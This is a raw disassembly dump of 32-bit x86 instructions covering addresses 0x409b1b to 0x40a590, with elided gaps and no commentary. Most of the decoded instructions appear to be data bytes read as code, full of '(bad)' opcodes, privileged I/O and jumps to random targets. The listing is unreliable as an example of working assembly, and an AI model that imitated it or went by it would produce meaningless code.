  409b1b:	into   
  409b1c:	ror    BYTE PTR [ecx+eiz*4-0xc00c79a],cl
  409b23:	inc    edx
  409b24:	inc    ecx
  409b25:	jne    0x409b0b
  409b27:	ins    DWORD PTR es:[edi],dx
  409b28:	mov    dh,0xfb
  409b2a:	hlt    
  409b2b:	repnz cdq 
  409b2d:	add    BYTE PTR [ecx+ebp*8],bl
  409b30:	inc    edx
  409b31:	je     0x409b4c
  409b33:	mov    edx,DWORD PTR [ebx-0x550de3ff]
  409b39:	mov    esp,0xff02b354
  409b3e:	xor    esi,ebp
  409b40:	sub    dl,BYTE PTR [ecx+0x0]
	...
  409b6b:	ins    BYTE PTR es:[edi],dx
  409b6c:	and    eax,0x42975040
  409b71:	mov    es,WORD PTR [ebp-0xbfd258]
  409b77:	in     al,dx
  409b78:	lahf   
  409b79:	sub    al,BYTE PTR [ecx-0x34]
  409b7c:	inc    ebp
  409b7d:	inc    eax
  409b7e:	mov    DWORD PTR [ecx-0x7c00c7be],esp
  409b84:	pop    edx
  409b85:	cwde   
  409b86:	lods   al,BYTE PTR ds:[esi]
  409b87:	jnp    0x409be6
  409b89:	mov    es,WORD PTR [ebp-0xc112ac]
  409b8f:	int3   
  409b90:	fld    DWORD PTR [ebx]
  409b92:	pop    edx
  409b93:	(bad)  
  409b95:	aas    
  409b96:	mov    ch,0x4c
  409b98:	add    eax,0x4f53ff3f
  409b9d:	and    eax,0x2af1dd48
  409ba2:	xchg   edx,eax
  409ba3:	jae    0x409bba
  409ba5:	aas    
  409ba6:	mov    DWORD PTR [ecx+0x33ff3716],esp
  409bac:	mov    BYTE PTR [eax+ebp*2],al
  409baf:	sub    eax,0x22ffc54b
  409bb4:	outs   dx,DWORD PTR ds:[esi]
  409bb5:	xor    al,0xf7
  409bb7:	sbb    ebx,DWORD PTR [ebx-0x5a]
  409bba:	aas    
  409bbb:	dec    ecx
  409bbc:	cli    
  409bbd:	xor    ch,al
  409bbf:	or     edi,esp
  409bc1:	sbb    al,0x6f
  409bc3:	add    esp,esp
  409bc5:	pop    edi
  409bc6:	mov    DWORD PTR [eax],ecx
  409bc8:	in     al,dx
  409bc9:	test   DWORD PTR [edi],edi
  409bcb:	xchg   BYTE PTR [ebx+0x11],bl
  409bce:	cmp    al,BYTE PTR [eax]
	...
  409bf8:	inc    ebp
  409bf9:	call   0x3f75:0xeaa93ee9
  409c00:	fninit 
  409c02:	sbb    esp,DWORD PTR ds:0x2be99a64
  409c08:	jb     0x409bbe
  409c0a:	push   ebp
  409c0b:	aas    
  409c0c:	xchg   ebp,eax
  409c0d:	fld    QWORD PTR [eax+0x37]
  409c10:	mov    ebx,0xd08973e3
  409c15:	jmp    0x409c54
  409c17:	aas    
  409c18:	dec    esp
  409c19:	jae    0x409c00
  409c1b:	fstp   DWORD PTR [ebx+ebx*2+0x2e]
  409c1f:	jns    0x409bad
  409c21:	jmp    0x409c48
  409c23:	aas    
  409c24:	xchg   ebx,eax
  409c25:	sub    eax,0x5adccc08
  409c2a:	add    ebx,esi
  409c2c:	mov    dl,0xe3
  409c2e:	or     eax,0xe06e5c0b
  409c33:	xor    BYTE PTR [ecx+0x6b3ef606],0x5e
  409c3a:	jl     0x409c4f
  409c3c:	arpl   WORD PTR [edx],bp
  409c3e:	pop    esi
  409c3f:	mov    DWORD PTR [ebx+ebp*8],edi
  409c42:	in     eax,0x3e
  409c44:	in     al,dx
  409c45:	bnd call 0xc223e7ba
  409c4b:	pop    ss
  409c4c:	pop    ss
  409c4d:	sbb    edx,DWORD PTR [ebp+0x6]
  409c50:	int3   
  409c51:	repnz mov esp,0xa5e3336a
  409c57:	mov    BYTE PTR [ebx+ebp*8],bh
  409c5a:	push   DWORD PTR [ebp+0x0]
	...
  409c84:	add    dl,ah
  409c86:	dec    ebp
  409c87:	add    cl,ch
  409c89:	pop    ds
  409c8a:	fidivr WORD PTR [ebp+ecx*4-0x16011db6]
  409c91:	shl    DWORD PTR [eax-0x7d],cl
  409c94:	push   esp
  409c95:	xor    ebp,edx
  409c97:	dec    BYTE PTR [esi+0x6a75671f]
  409c9d:	pushf  
  409c9e:	repz idiv BYTE PTR [esi+0x2a]
  409ca2:	pop    ebx
  409ca3:	je     0x409caa
  409ca5:	mov    dh,0xe2
  409ca7:	mov    esp,DWORD PTR [edi+esi*2-0x16]
  409cab:	(bad)  
  409cac:	out    dx,ax
  409cae:	loope  0x409c64
  409cb0:	inc    ebp
  409cb1:	adc    ah,dl
  409cb3:	inc    BYTE PTR [ecx-0x39]
  409cb6:	pop    es
  409cb7:	dec    DWORD PTR [esi+0x26]
  409cba:	sbb    esi,DWORD PTR [ebp+ebx*4-0x62]
  409cbe:	mov    al,ds:0xe1ea36d7
  409cc3:	(bad)  
  409cc4:	mov    esp,0xe9007ad6
  409cc9:	dec    edx
  409cca:	mov    eax,ds:0xf3279cfe
  409ccf:	push   ecx
  409cd0:	push   ecx
  409cd1:	dec    edx
  409cd2:	loop   0x409cd2
  409cd4:	pop    esp
  409cd5:	xor    ebp,edx
  409cd7:	dec    BYTE PTR [esi]
  409cd9:	cmp    ch,BYTE PTR [eax+0x8]
  409cdc:	adc    ecx,edi
  409cde:	mov    dl,0xfe
  409ce0:	(bad)  
  409ce1:	sub    DWORD PTR [eax-0x1dde0119],ebp
  409ce7:	(bad)  
  409ce8:	je     0x409cea
	...
  409d12:	daa    
  409d13:	repz xchg edi,eax
  409d15:	xchg   ecx,eax
  409d16:	adc    edx,esp
  409d18:	(bad)  
  409d19:	xchg   esp,eax
  409d1a:	call   0x2179c08
  409d1f:	test   al,0xe3
  409d21:	(bad)  
  409d22:	stc    
  409d23:	loope  0x409d23
  409d25:	add    al,dh
  409d27:	dec    esi
  409d28:	call   0xff612a85
  409d2d:	jmp    DWORD PTR [eax-0x350008ca]
  409d33:	pop    ds
  409d34:	jne    0x409d3e
  409d36:	lods   eax,DWORD PTR ds:[esi]
  409d37:	inc    edx
  409d38:	test   al,0xff
  409d3a:	stos   BYTE PTR es:[edi],al
  409d3b:	pop    ds
  409d3c:	mov    ch,0xe4
  409d3e:	mov    ds:0x2de8ff1f,al
  409d43:	je     0x409d44
  409d45:	call   FWORD PTR [edx+0x6af7ec69]
  409d4b:	and    al,ch
  409d4d:	dec    ebp
  409d4e:	pop    esi
  409d4f:	and    bh,bh
  409d51:	call   DWORD PTR [eax]
  409d53:	das    
  409d54:	idiv   edi
  409d56:	cmp    ch,BYTE PTR [edi]
  409d58:	inc    edx
  409d59:	stos   DWORD PTR es:[edi],eax
  409d5a:	push   0x20
  409d5c:	push   DWORD PTR [ebp-0xd79b]
  409d62:	pop    ebp
  409d63:	call   0x209b9d11
  409d68:	inc    ebp
  409d69:	clc    
  409d6a:	dec    esp
  409d6b:	sbb    eax,0x1feafffd
  409d70:	jne    0x409d6e
  409d72:	fisttp QWORD PTR [ebx]
  409d74:	xchg   esi,eax
	...
  409d9d:	add    BYTE PTR [eax],al
  409d9f:	test   DWORD PTR [edx+eax*8-0x75f78af8],edx
  409da6:	in     al,dx
  409da7:	not    BYTE PTR [edx+0x5190fff4]
  409dad:	call   0x976e9d
  409db2:	mov    eax,eax
  409db4:	and    eax,0x356d75ff
  409db9:	and    DWORD PTR [ebx+0x45891e4a],ebp
  409dbf:	cmp    DWORD PTR [esi],ebx
  409dc1:	jne    0x409dbf
  409dc3:	push   0xffffffa8
  409dc5:	idiv   bh
  409dc7:	sbb    al,0x7f
  409dc9:	adc    al,ch
  409dcb:	cmc    
  409dcc:	enter  0xff3b,0x27
  409dd0:	mov    ah,0xb6
  409dd2:	cmp    eax,0x6a383695
  409dd7:	sbb    al,0x77
  409dd9:	(bad)  
  409dda:	rep ins BYTE PTR es:[edi],dx
  409ddc:	mov    cl,0xb5
  409dde:	sti    
  409ddf:	add    al,0x54
  409de1:	pop    eax
  409de2:	dec    DWORD PTR [ebx]
  409de4:	out    dx,al
  409de5:	inc    edx
  409de6:	je     0x409e1d
  409de8:	pop    edx
  409de9:	add    al,0x10
  409deb:	or     edx,DWORD PTR [ecx-0x35db8ac4]
  409df1:	xchg   BYTE PTR [edi+0x753c61eb],ah
  409df7:	in     al,0x69
  409df9:	mov    dh,0xb
  409dfb:	(bad)  
  409dfd:	or     ch,al
  409dff:	adc    cl,0x3b
  409e02:	inc    DWORD PTR [eax]
	...
  409e2c:	retf   
  409e2d:	pop    es
  409e2e:	aaa    
  409e2f:	dec    DWORD PTR [ecx-0x7a]
  409e32:	cmp    al,0x75
  409e34:	and    al,0x9a
  409e36:	popf   
  409e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e38:	mov    bl,0x99
  409e3a:	cmp    al,0x75
  409e3c:	test   al,0x8a
  409e3e:	ins    BYTE PTR es:[edi],dx
  409e3f:	stos   BYTE PTR es:[edi],al
  409e40:	mov    ds:0x24c24a29,eax
  409e45:	repnz aad 0x8a
  409e48:	xor    BYTE PTR [ebp+0x47],0xe8
  409e4c:	repnz inc eax
  409e4e:	mov    dh,0xb
  409e50:	je     0x409e1d
  409e52:	imul   edi,edi,0x7b
  409e55:	std    
  409e56:	inc    edx
  409e57:	jne    0x409e72
  409e59:	mov    eax,0xf214c249
  409e5e:	lea    eax,[ebp+0x6c]
  409e61:	ret    0x753b
  409e64:	sub    BYTE PTR [edx-0x18],bl
  409e67:	scas   eax,DWORD PTR es:[edi]
  409e68:	push   ebx
  409e69:	pop    ebx
  409e6a:	out    0xf,al
  409e6c:	pop    esp
  409e6d:	push   eax
  409e6e:	gs sahf 
  409e70:	sbb    al,0x5b
  409e72:	jmp    0xc11f4fb1
  409e77:	mov    al,BYTE PTR [esi-0x1e723a20]
  409e7d:	out    dx,al
  409e7e:	mov    ebp,0x3be027b1
  409e83:	sub    BYTE PTR [ebx],bl
  409e85:	data16 mov cl,0x2c
  409e88:	enter  0xa5b4,0x3b
  409e8c:	xchg   edi,eax
  409e8d:	lea    ebp,gs:[edi]
	...
  409eb8:	add    BYTE PTR [ebp+0x73],dl
  409ebb:	sub    al,0xde
  409ebd:	pop    esp
  409ebe:	pop    ebx
  409ebf:	aaa    
  409ec0:	sub    al,0xd0
  409ec2:	enter  0x3e8,0x17
  409ec6:	sbb    esi,esp
  409ec8:	add    eax,0x34621df7
  409ecd:	inc    esp
  409ece:	xchg   esi,eax
  409ecf:	adc    eax,ebp
  409ed1:	shl    edi,cl
  409ed3:	add    dl,BYTE PTR [ecx+0x33ea5b1c]
  409ed9:	xchg   ebp,eax
  409eda:	gs inc ecx
  409edc:	lods   al,BYTE PTR ds:[esi]
  409edd:	dec    edi
  409ede:	test   DWORD PTR [eax-0x7d0cb5fd],ebp
  409ee4:	xchg   edx,eax
  409ee5:	sbb    al,0x5b
  409ee7:	repnz inc ebx
  409ee9:	sub    DWORD PTR [ebp+0x42],ebx
  409eec:	pop    ds
  409eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eee:	dec    edx
  409eef:	daa    
  409ef0:	add    al,0x1c
  409ef2:	mov    edi,DWORD PTR [ebx+0x1df3113a]
  409ef8:	mov    cl,0x1b
  409efa:	repz (bad) 
  409efe:	fbstp  TBYTE PTR [edx+0x694a9bdb]
  409f04:	cli    
  409f05:	imul   esp,DWORD PTR [esi+0x3b],0xffffffac
  409f09:	sbb    al,0x4b
  409f0b:	add    BYTE PTR [esi],al
  409f0d:	(bad)  
  409f0e:	fbstp  TBYTE PTR [ecx+eiz*8+0x7]
  409f12:	test   al,0xa5
  409f14:	out    0x6,al
  409f16:	loopne 0x409f8c
  409f18:	fld    QWORD PTR [esi]
  409f1a:	data16 in al,dx
  409f1c:	(bad)  
	...
  409f45:	add    BYTE PTR [edi+edx*2-0x18],ch
  409f49:	scas   al,BYTE PTR es:[edi]
  409f4a:	mov    ebp,0x6cc6fedf
  409f4f:	repz out 0xb9,eax
  409f52:	mov    al,0xdf
  409f54:	(bad)  
  409f55:	fs fsub st(6),st
  409f58:	dec    edi
  409f59:	shl    DWORD PTR [esi],0xab
  409f5c:	(bad)  
  409f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f5e:	cmp    bl,BYTE PTR [ebx+0x5e]
  409f61:	mov    al,0x59
  409f63:	push   ebx
  409f64:	add    BYTE PTR [ebx+ebp*4],bh
  409f67:	out    dx,eax
  409f68:	and    BYTE PTR [ebp+0x1300712b],0xd
  409f6f:	fidiv  WORD PTR [ecx+esi*8+0x37]
  409f73:	push   ebp
  409f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f75:	jbe    0x409f8d
  409f77:	aam    0x44
  409f79:	ins    DWORD PTR es:[edi],dx
  409f7a:	xchg   DWORD PTR [ebx+0x5a],ecx
  409f7d:	test   al,0x1f
  409f7f:	fidiv  WORD PTR [ecx+esi*8-0x9]
  409f83:	mov    ch,0xfb
  409f85:	push   esi
  409f86:	div    BYTE PTR [eax+0x0]
  409f89:	rol    DWORD PTR [edx+0x77e94184],0x85
  409f90:	pop    edx
  409f91:	test   al,0x1f
  409f93:	fidiv  WORD PTR [eax+ecx*2]
  409f96:	addr16 fwait
  409f98:	add    BYTE PTR [ecx+0x16],al
  409f9b:	scas   eax,DWORD PTR es:[edi]
  409f9c:	(bad)  
  409f9d:	sbb    bl,BYTE PTR es:[ebx]
  409fa0:	je     0x409fa5
  409fa2:	mov    al,0x24
  409fa4:	pop    edx
  409fa5:	test   al,0x1f
  409fa7:	mov    ebp,eax
  409fa9:	bound  eax,QWORD PTR [eax]
	...
  409fd3:	add    al,0xde
  409fd5:	inc    BYTE PTR [eax]
  409fd7:	test   DWORD PTR [edx],ecx
  409fd9:	(bad)  
  409fda:	jne    0x40a049
  409fdc:	xor    ah,bl
  409fde:	(bad)  
  409fdf:	push   edx
  409fe0:	and    al,0xe8
  409fe2:	mov    esp,ebx
  409fe4:	and    bh,bh
  409fe6:	push   0x1f
  409fe8:	das    
  409fe9:	fisubr DWORD PTR [ebp-0x3ff4db9e]
  409fef:	fscale 
  409ff1:	cs out dx,ax
  409ff4:	sbb    edi,edi
  409ff6:	dec    edi
  409ff7:	dec    ebp
  409ff8:	mov    ecx,0xaf62ffab
  409ffd:	cmp    BYTE PTR [edx+0x44],bl
  40a000:	push   edi
  40a001:	push   eax
  40a002:	call   0x401635
  40a007:	inc    ebp
  40a008:	pop    es
  40a009:	(bad)  
  40a00a:	jne    0x40a019
  40a00c:	xor    dh,BYTE PTR [ebx-0x17dc6d02]
  40a012:	pop    ecx
  40a013:	pop    esp
  40a014:	and    al,0xff
  40a016:	push   0x1
  40a018:	xor    ch,BYTE PTR [edx+0xb2462ad]
  40a01e:	rcr    cl,0xfc
  40a021:	data16 cs das 
  40a024:	sbb    bh,bh
  40a026:	dec    edi
  40a027:	ins    DWORD PTR es:[edi],dx
  40a028:	jmp    0xafa39fd8
  40a02d:	cmp    BYTE PTR [edx-0x7c],bl
  40a030:	pop    ecx
  40a031:	push   eax
  40a032:	call   0x401655
	...
  40a05f:	add    BYTE PTR [ebp-0x528a01f7],al
  40a065:	xor    DWORD PTR [ebx-0x17dbad02],eax
  40a06b:	sub    DWORD PTR [ebx+eiz*1+0x31566aff],ebx
  40a072:	jp     0x40a021
  40a074:	and    ah,BYTE PTR [ebx+ecx*1]
  40a077:	rcr    BYTE PTR [eax+eax*8],0xdd
  40a07b:	addr16 inc edx
  40a07d:	stos   BYTE PTR es:[edi],al
  40a07e:	sar    edi,0xdb
  40a081:	dec    ebx
  40a082:	add    ch,BYTE PTR [ebp+0x39aadc63]
  40a088:	div    BYTE PTR [edx-0x17bbaffe]
  40a08e:	dec    WORD PTR [ebx+0x23]
  40a092:	aam    0xfe
  40a094:	leave  
  40a095:	jmp    0x40a0c1
  40a097:	push   ebx
  40a098:	cmp    al,BYTE PTR [eax+edi*1]
  40a09b:	call   0xff787bd5
  40a0a0:	sub    ebx,DWORD PTR [esi]
  40a0a2:	cmp    bh,bh
  40a0a4:	test   eax,0xc26c2aeb
  40a0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0aa:	aaa    
  40a0ab:	leave  
  40a0ac:	fdivrp st(6),st
  40a0ae:	add    dl,BYTE PTR [ebp-0x69]
  40a0b1:	mov    BYTE PTR [ecx+0x37c5e0c4],0xff
  40a0b8:	test   eax,0xf350382f
  40a0bd:	inc    edi
  40a0be:	adc    al,0xff
  40a0c0:	jno    0x40a0a8
  40a0c2:	sub    al,BYTE PTR [eax+eax*1]
	...
  40a0ed:	mov    edx,esi
  40a0ef:	add    cl,BYTE PTR [ebx]
  40a0f1:	fdivr  st(5),st
  40a0f3:	jge    0x40a0b3
  40a0f5:	sbb    eax,0x61c702f2
  40a0fa:	jp     0x40a0ff
  40a0fc:	add    BYTE PTR [edx+esi*8],bl
  40a0ff:	aas    
  40a100:	inc    ebp
  40a101:	mov    al,0x85
  40a103:	add    BYTE PTR [eax],al
  40a105:	sbb    al,0x18
  40a107:	add    ebp,DWORD PTR [edx+0x1c]
  40a10a:	or     BYTE PTR [ebx],al
  40a10c:	push   0x1c
  40a10e:	outs   dx,DWORD PTR ds:[esi]
  40a10f:	mov    esi,0x7e76ecf3
  40a114:	hlt    
  40a115:	mov    ebp,DWORD PTR ds:0x5b8b5038
  40a11b:	pushf  
  40a11c:	cmp    eax,DWORD PTR [ebx+0x522b1d66]
  40a122:	(bad)  
  40a123:	call   0x955bc82b
  40a128:	(bad)  
  40a129:	je     0x40a105
  40a12b:	out    0x3,eax
  40a12d:	sbb    al,0x73
  40a12f:	cmp    al,0xcb
  40a131:	fcomp  QWORD PTR [edx-0xa]
  40a134:	lods   eax,DWORD PTR ds:[esi]
  40a135:	and    esi,ebx
  40a137:	lds    esp,FWORD PTR [edi+0x4b]
  40a13a:	fdivr  QWORD PTR [eax]
  40a13c:	mov    ebp,DWORD PTR [esi+ecx*8+0x63]
  40a140:	xor    BYTE PTR [ebx],dh
  40a142:	(bad)  
  40a144:	aam    0xcd
  40a146:	repnz cmc 
  40a148:	addr16 sub ebx,esp
  40a14b:	outs   dx,DWORD PTR ds:[esi]
  40a14c:	sub    DWORD PTR [esp+eiz*8],0x37bd
	...
  40a177:	add    BYTE PTR [eax],al
  40a179:	add    BYTE PTR [esi+ebp*2],al
  40a17c:	xor    DWORD PTR [edi],0xabe97113
  40a182:	xchg   esi,eax
  40a183:	sub    BYTE PTR [eax],0x4
  40a186:	add    esp,DWORD PTR [esi-0x2404d068]
  40a18c:	xchg   ebp,eax
  40a18d:	mov    cl,0x27
  40a18f:	repz sbb BYTE PTR [ebx-0x15],ch
  40a193:	fld    TBYTE PTR [edi-0x7f]
  40a196:	clc    
  40a197:	jecxz  0x40a216
  40a199:	aaa    
  40a19a:	inc    esi
  40a19b:	pop    ebx
  40a19c:	add    DWORD PTR [eax+0x36e99a76],edx
  40a1a2:	xchg   ecx,eax
  40a1a3:	jmp    0x7d3:0xdbc3375d
  40a1aa:	les    eax,FWORD PTR [ebp-0x2e4cc87e]
  40a1b0:	arpl   WORD PTR [ebx+esi*4],sp
  40a1b3:	fild   DWORD PTR [ebp-0x56]
  40a1b6:	mov    ds:0xdcd9c273,eax
  40a1bb:	pop    edx
  40a1bc:	add    BYTE PTR [esi],dh
  40a1be:	or     eax,0x532ef6eb
  40a1c3:	fdiv   QWORD PTR [ebp+esi*8+0x37]
  40a1c7:	and    DWORD PTR [ebx-0x7b2dcce2],ebp
  40a1cd:	add    eax,0x83fedc43
  40a1d2:	pop    ds
  40a1d3:	jae    0x40a157
  40a1d5:	mov    ds:0x34fddb58,eax
  40a1da:	adc    ah,ah
  40a1dc:	(bad)  
  40a1dd:	test   BYTE PTR [eax],0x0
	...
  40a204:	add    BYTE PTR [eax],al
  40a206:	add    BYTE PTR [edx],cl
  40a208:	data16 or al,0x1
  40a20b:	xor    esi,DWORD PTR [eax-0x2a6f1902]
  40a211:	out    0xd6,eax
  40a213:	repnz fld TBYTE PTR [ecx-0x17]
  40a217:	xchg   DWORD PTR [ebp-0x23dfd7a7],edi
  40a21d:	mov    ah,0xb9
  40a21f:	repnz (bad) 
  40a222:	mov    esi,0xede866cc
  40a227:	xchg   dl,bl
  40a229:	(bad)  
  40a22a:	pusha  
  40a22b:	pushf  
  40a22c:	mov    bh,0xf6
  40a22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a22f:	dec    edx
  40a230:	fidivr WORD PTR [ebp+eax*4-0x160125b6]
  40a237:	lods   al,BYTE PTR ds:[esi]
  40a238:	arpl   WORD PTR [ebx-0x12dc0b4],ax
  40a23e:	xchg   BYTE PTR [edi],bl
  40a240:	dec    edi
  40a241:	gs push 0x54
  40a244:	(bad)  
  40a245:	div    BYTE PTR [esi+0xa]
  40a248:	pop    ebx
  40a249:	je     0x40a258
  40a24b:	lahf   
  40a24c:	sbb    al,ch
  40a24e:	pop    esi
  40a24f:	or     bl,dl
  40a251:	call   esp
  40a253:	into   
  40a254:	inc    edx
  40a255:	add    cl,ch
  40a257:	cli    
  40a258:	sbb    bh,bh
  40a25a:	aam    0x17
  40a25c:	ret    
  40a25d:	add    BYTE PTR gs:[ecx+0x10ffff91],dl
  40a264:	xor    bh,0xff
  40a267:	dec    edx
  40a268:	xchg   ecx,eax
  40a269:	jne    0x40a273
	...
  40a293:	add    ch,bl
  40a295:	push   ebx
  40a296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a297:	(bad)  
  40a298:	cmp    dl,BYTE PTR [ecx-0x6eed174b]
  40a29e:	(bad)  
  40a29f:	call   DWORD PTR [eax-0x1e53179a]
  40a2a5:	nop
  40a2a6:	(bad)  
  40a2a7:	jmp    DWORD PTR [eax]
  40a2a9:	jp     0x40a2a2
  40a2ab:	call   FWORD PTR [edx-0x70]
  40a2ae:	jne    0x40a2b8
  40a2b0:	sbb    eax,0x3affa3f0
  40a2b5:	nop
  40a2b6:	mov    ch,0xe0
  40a2b8:	bound  edx,QWORD PTR [eax+0x66d0ffff]
  40a2be:	call   0xffd14453
  40a2c3:	call   DWORD PTR [eax+0x5afff733]
  40a2c9:	nop
  40a2ca:	jne    0x40a2d4
  40a2cc:	in     eax,dx
  40a2cd:	fsub   QWORD PTR [ebx-0x4a703501]
  40a2d3:	in     al,0xd2
  40a2d5:	(bad)  
  40a2d6:	(bad)  
  40a2d7:	call   0x3fdaed
  40a2dc:	call   0xe88f:0x8af7e049
  40a2e3:	pop    ecx
  40a2e4:	bound  edx,QWORD PTR [eax-0x7cdf0001]
  40a2ea:	idiv   edi
  40a2ec:	pop    edx
  40a2ed:	xchg   DWORD PTR [esi-0x59],ecx
  40a2f0:	dec    edx
  40a2f1:	nop
  40a2f2:	push   DWORD PTR [ebp-0x7863]
	...
  40a320:	add    BYTE PTR [ebp-0x64],ch
  40a323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a324:	call   FWORD PTR [edx-0x70]
  40a327:	mov    ch,0xdc
  40a329:	sbb    al,0x39
  40a32b:	xor    eax,0x5d6bb4ff
  40a330:	jmp    DWORD PTR [ebx-0x6c0f90e0]
  40a336:	cwde   
  40a337:	xor    eax,0x33c009ff
  40a33c:	jne    0x40a352
  40a33e:	sbb    al,0xf7
  40a340:	std    
  40a341:	add    DWORD PTR [eax+0x706cb535],0x35
  40a348:	inc    DWORD PTR [edi+ecx*8+0x686bff5b]
  40a34f:	mov    edi,0x34f275f7
  40a354:	call   FWORD PTR [ebx-0x28]
  40a357:	lods   eax,DWORD PTR ds:[esi]
  40a358:	sti    
  40a359:	inc    esp
  40a35a:	or     edx,DWORD PTR [eax+0x427b1c00]
  40a360:	or     al,0x1c
  40a362:	xchg   edi,eax
  40a363:	mov    esp,ebp
  40a365:	lahf   
  40a366:	push   DWORD PTR [esi]
  40a368:	push   0x1c
  40a36a:	push   ds
  40a36b:	push   cs
  40a36c:	push   DWORD PTR [ecx+0x782e2abb]
  40a372:	mov    al,ds:0x16618933
  40a377:	stos   DWORD PTR es:[edi],eax
  40a378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a379:	jbe    0x40a2fe
  40a37b:	add    al,0x68
  40a37d:	push   ds
  40a37e:	ret    0x8002
  40a381:	add    edi,DWORD PTR [eax+0xc]
  40a384:	call   0x40a389
	...
  40a3ad:	add    bl,dh
  40a3af:	div    DWORD PTR [ebx]
  40a3b1:	inc    DWORD PTR [edx+ebx*1-0x16e3bf27]
  40a3b8:	in     eax,dx
  40a3b9:	loopne 0x40a40f
  40a3bb:	add    DWORD PTR [edi+edi*8],0x51
  40a3bf:	retf   0xe42a
  40a3c2:	rcl    DWORD PTR [ecx+0x34],1
  40a3c5:	call   DWORD PTR [ecx+0x46]
  40a3c8:	xor    al,0x75
  40a3ca:	adc    al,0x5b
  40a3cc:	push   ecx
  40a3cd:	ret    0xd87f
  40a3d0:	pop    ebp
  40a3d1:	dec    edx
  40a3d2:	ficomp WORD PTR [edi-0x17]
  40a3d5:	into   
  40a3d6:	xchg   esi,eax
  40a3d7:	(bad)  
  40a3d8:	addr16 aas 
  40a3da:	rcl    al,0x45
  40a3dd:	xor    al,0xa9
  40a3df:	push   ds
  40a3e0:	cmp    eax,0xd94e92d3
  40a3e5:	xor    al,0x11
  40a3e7:	addr16 inc ecx
  40a3e9:	pop    edx
  40a3ea:	scas   al,BYTE PTR es:[edi]
  40a3eb:	pop    ebx
  40a3ec:	jmp    0x64a8fff9
  40a3f1:	jne    0x40a410
  40a3f3:	pop    ebx
  40a3f4:	jmp    0xe9138535
  40a3f9:	add    ebx,DWORD PTR [ebx+ebx*2]
  40a3fc:	cs mov esi,0x3e5d84f
  40a402:	sbb    al,0x45
  40a404:	jmp    0xe982efb2
  40a409:	test   eax,0x382be743
  40a40e:	int3   
  40a40f:	in     eax,0x63
  40a411:	cmp    BYTE PTR [eax],al
	...
  40a43b:	sub    ebx,eax
  40a43d:	aad    0xd4
  40a43f:	sub    cl,BYTE PTR [esi-0x2f]
  40a442:	xor    ebp,DWORD PTR [ecx-0x51a02f2a]
  40a448:	pop    edx
  40a449:	jmp    0xec8f784c
  40a44e:	sbb    al,0x9d
  40a450:	pop    ecx
  40a451:	jmp    0x31571859
  40a456:	(bad)  
  40a459:	adc    edx,DWORD PTR [esp+eax*1]
  40a45c:	xlat   BYTE PTR ds:[ebx]
  40a45d:	aas    
  40a45e:	xor    ebp,ebx
  40a460:	sub    ah,BYTE PTR [edx+0x54]
  40a463:	xchg   ecx,eax
  40a464:	fnstsw WORD PTR [ebx+edi*1-0x25]
  40a468:	xlat   BYTE PTR ds:[ebx]
  40a469:	sbb    dh,dl
  40a46b:	mov    ebx,0xf3fffc6
  40a470:	fmul   DWORD PTR [eax-0x12ff79c]
  40a476:	data16 sbb BYTE PTR ds:0x44ef5ea6,bl
  40a47d:	add    cl,al
  40a47f:	or     dh,BYTE PTR ds:0xdeee941
  40a485:	lock ds dec edi
  40a488:	fdivr  st,st(6)
  40a48a:	mov    ah,0x93
  40a48c:	mov    edi,0xd84f8044
  40a491:	mov    BYTE PTR [esp+esi*1-0x30],ah
  40a495:	(bad)  
  40a496:	es call 0x1a:0x621666d7
  40a49e:	push   ss
	...
  40a4c7:	add    ch,ah
  40a4c9:	retf   0xef6
  40a4cc:	das    
  40a4cd:	fdiv   DWORD PTR [ebp+esi*8+0x37]
  40a4d1:	test   DWORD PTR [ecx-0x7b1df102],ebp
  40a4d7:	or     DWORD PTR [edi],eax
  40a4d9:	fdivr  st,st(6)
  40a4db:	sbb    DWORD PTR [edi],0x43
  40a4de:	aad    0x43
  40a4e0:	popa   
  40a4e1:	xlat   BYTE PTR ds:[ebx]
  40a4e2:	std    
  40a4e3:	xchg   esp,eax
  40a4e4:	out    dx,eax
  40a4e5:	iret   
  40a4e6:	(bad)  
  40a4e7:	(bad)  
  40a4e8:	out    dx,al
  40a4e9:	dec    ebp
  40a4ea:	or     al,0xc1
  40a4ec:	push   ds
  40a4ed:	add    bh,bh
  40a4ef:	(bad)  
  40a4f0:	cwde   
  40a4f1:	loopne 0x40a4de
  40a4f3:	mov    dh,0x4e
  40a4f5:	(bad)  
  40a4f6:	imul   ebp,ecx,0x2859b5a7
  40a4fc:	sbb    dh,dl
  40a4fe:	mov    ah,0x99
  40a500:	ss (bad) 
  40a502:	(bad)  
  40a503:	sahf   
  40a504:	mov    ah,0x62
  40a506:	call   0xff16eca8
  40a50b:	pusha  
  40a50c:	xchg   esp,eax
  40a50d:	ret    
  40a50e:	test   BYTE PTR [eax],0xa2
  40a511:	mov    DWORD PTR [edx+0x0],ebp
  40a514:	sub    eax,0xb5415b63
  40a519:	mov    DWORD PTR [ebp-0x76b510],esi
  40a51f:	(bad)  
  40a520:	fcom   st(6)
  40a522:	out    0xd9,al
  40a524:	lea    ecx,[ecx+0x263889ff]
  40a52a:	idiv   edi
	...
  40a554:	add    BYTE PTR [edx-0x23],dl
  40a557:	mov    esp,0xff895ae4
  40a55c:	add    al,cl
  40a55e:	xlat   BYTE PTR ds:[ebx]
  40a55f:	cmp    DWORD PTR [ebp-0x6f2b],0x83640e75
  40a569:	add    BYTE PTR [esi-0x9],dh
  40a56c:	call   DWORD PTR [edx]
  40a56e:	pop    edx
  40a56f:	je     0x40a5cd
  40a571:	test   BYTE PTR [edx-0x18],0xf7
  40a575:	adc    cl,BYTE PTR [ecx-0xd498c00]
  40a57b:	(bad)  
  40a57c:	jmp    DWORD PTR [edx]
  40a57e:	dec    esp
  40a57f:	push   DWORD PTR [ebp+0x3d]
  40a582:	jb     0x40a5bf
  40a584:	mov    ds:0xb5ff8c32,al
  40a589:	push   ecx
  40a58a:	xchg   esp,eax
  40a58b:	(bad)  
  40a58c:	call   DWORD PTR [edx+0xe]
  40a58f:	pop    es
  40a590:	call   0x3fe257
